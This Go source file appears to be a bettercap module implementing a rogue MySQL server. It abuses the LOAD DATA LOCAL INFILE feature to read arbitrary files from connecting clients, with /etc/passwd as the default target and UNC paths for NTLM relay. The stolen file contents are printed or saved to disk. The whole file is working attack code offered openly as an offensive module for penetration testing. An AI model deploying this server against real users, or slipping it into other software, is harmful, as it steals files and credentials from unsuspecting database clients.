package mysql_server

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"strings"

	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/evilsocket/islazy/tui"
)

type MySQLServer struct {
	session.SessionModule
	address  *net.TCPAddr
	listener *net.TCPListener
	infile   string
	outfile  string
}

func NewMySQLServer(s *session.Session) *MySQLServer {
	mod := &MySQLServer{
		SessionModule: session.NewSessionModule("mysql.server", s),
	}

	mod.AddParam(session.NewStringParameter("mysql.server.infile",
		"/etc/passwd",
		"",
		"File you want to read. UNC paths are also supported."))

	mod.AddParam(session.NewStringParameter("mysql.server.outfile",
		"",
		"",
		"If filled, the INFILE buffer will be saved to this path instead of being logged."))

	mod.AddParam(session.NewStringParameter("mysql.server.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"Address to bind the mysql server to."))

	mod.AddParam(session.NewIntParameter("mysql.server.port",
		"3306",
		"Port to bind the mysql server to."))

	mod.AddHandler(session.NewModuleHandler("mysql.server on", "",
		"Start mysql server.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("mysql.server off", "",
		"Stop mysql server.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod *MySQLServer) Name() string {
	return "mysql.server"
}

func (mod *MySQLServer) Description() string {
	return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."
}

func (mod *MySQLServer) Author() string {
	return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
}

func (mod *MySQLServer) Configure() error {
	var err error
	var address string
	var port int

	if mod.Running() {
		return session.ErrAlreadyStarted(mod.Name())
	} else if err, mod.infile = mod.StringParam("mysql.server.infile"); err != nil {
		return err
	} else if err, mod.outfile = mod.StringParam("mysql.server.outfile"); err != nil {
		return err
	} else if err, address = mod.StringParam("mysql.server.address"); err != nil {
		return err
	} else if err, port = mod.IntParam("mysql.server.port"); err != nil {
		return err
	} else if mod.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
		return err
	} else if mod.listener, err = net.ListenTCP("tcp", mod.address); err != nil {
		return err
	}
	return nil
}

func (mod *MySQLServer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {
		mod.Info("server starting on address %s", mod.address)
		for mod.Running() {
			if conn, err := mod.listener.AcceptTCP(); err != nil {
				mod.Warning("error while accepting tcp connection: %s", err)
				continue
			} else {
				defer conn.Close()

				// TODO: include binary support and files > 16kb
				clientAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
				readBuffer := make([]byte, 16384)
				reader := bufio.NewReader(conn)
				read := 0

				mod.Info("connection from %s", clientAddress)

				if _, err := conn.Write(packets.MySQLGreeting); err != nil {
					mod.Warning("error while writing server greeting: %s", err)
					continue
				} else if _, err = reader.Read(readBuffer); err != nil {
					mod.Warning("error while reading client message: %s", err)
					continue
				}

				// parse client capabilities and validate connection
				// TODO: parse mysql connections properly and
				//       display additional connection attributes
				capabilities := fmt.Sprintf("%08b", (int(uint32(readBuffer[4]) | uint32(readBuffer[5])<<8)))
				loadData := string(capabilities[8])
				username := string(bytes.Split(readBuffer[36:], []byte{0})[0])

				mod.Info("can use LOAD DATA LOCAL: %s", loadData)
				mod.Info("login request username: %s", tui.Bold(username))

				if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {
					mod.Warning("error while writing server first response ok: %s", err)
					continue
				} else if _, err := reader.Read(readBuffer); err != nil {
					mod.Warning("error while reading client message: %s", err)
					continue
				} else if _, err := conn.Write(packets.MySQLGetFile(mod.infile)); err != nil {
					mod.Warning("error while writing server get file request: %s", err)
					continue
				} else if read, err = reader.Read(readBuffer); err != nil {
					mod.Warning("error while readind buffer: %s", err)
					continue
				}

				if strings.HasPrefix(mod.infile, "\\") {
					mod.Info("NTLM from '%s' relayed to %s", clientAddress, mod.infile)
				} else if fileSize := read - 9; fileSize < 4 {
					mod.Warning("unexpected buffer size %d", read)
				} else {
					mod.Info("read file ( %s ) is %d bytes", mod.infile, fileSize)

					fileData := readBuffer[4 : read-4]

					if mod.outfile == "" {
						mod.Info("\n%s", string(fileData))
					} else {
						mod.Info("saving to %s ...", mod.outfile)
						if err := ioutil.WriteFile(mod.outfile, fileData, 0755); err != nil {
							mod.Warning("error while saving the file: %s", err)
						}
					}
				}

				conn.Write(packets.MySQLSecondResponseOK)
			}
		}
	})
}

func (mod *MySQLServer) Stop() error {
	return mod.SetRunning(false, func() {
		defer mod.listener.Close()
	})
}
